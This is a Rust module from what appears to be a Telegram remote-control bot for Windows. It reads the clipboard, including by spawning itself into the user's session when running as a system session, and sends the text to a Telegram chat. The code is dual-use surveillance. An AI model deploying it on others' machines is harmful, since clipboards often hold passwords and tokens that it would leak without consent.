use anyhow::Result;
use clipboard_win::{formats, get_clipboard};
use teloxide::prelude::*;
use teloxide::types::{ChatId, MessageId};

use crate::bot::md;
use crate::machine::session;

pub async fn clipboard(bot: &Bot, chat_id: ChatId, reply_to: MessageId) -> Result<()> {
    let text = if session::is_system_session() {
        let exe = std::env::current_exe()?;
        let args = vec!["--clipboard".into()];
        match tokio::task::spawn_blocking(move || {
            session::capture_in_user_session(&exe, args, 10000)
        })
        .await
        {
            Ok(Ok((_, output))) => String::from_utf8_lossy(&output).to_string(),
            _ => String::new(),
        }
    } else {
        get_clipboard(formats::Unicode).unwrap_or_default()
    };

    if text.is_empty() {
        md::send(bot, chat_id, reply_to, "📭 Clipboard trống".to_string()).await?;
    } else {
        let truncated = crate::bot::truncate_str(&text, 3800);
        let suffix = if truncated.len() < text.len() {
            "\n...(truncated)"
        } else {
            ""
        };
        let escaped = md::escape(&format!("{truncated}{suffix}"));
        md::send(
            bot,
            chat_id,
            reply_to,
            format!("*📋 Clipboard:*\n\n{escaped}"),
        )
        .await?;
    }

    Ok(())
}

pub fn capture_clipboard() -> Result<()> {
    let text: String = get_clipboard(formats::Unicode).unwrap_or_default();
    print!("{text}");
    Ok(())
}
